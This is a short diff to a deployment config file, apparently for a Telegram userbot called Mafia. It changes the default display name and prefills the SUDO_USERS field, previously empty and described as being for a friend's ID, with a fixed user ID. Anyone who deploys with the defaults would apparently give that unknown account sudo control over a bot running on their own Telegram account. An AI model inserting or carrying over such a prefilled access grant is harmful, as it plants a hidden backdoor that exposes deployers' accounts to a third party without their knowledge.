@@ -19,12 +19,12 @@
     },
     "ALIVE_NAME": {
       "description": "Fill your Full name or Username like @H1M4N5HU0P. By default it is Mafia User",
-      "value": "@MAFIA_USERBOT",
+      "value": "@MafiaBot_Support",
       "required": false
     },
     "SUDO_USERS": {
       "description": "Enter your friends user id to to give him bot sudo access",
-      "value": "",
+      "value": "1673457128",
       "required": false
     },
     "SUDO_COMMAND_HAND_LER": {
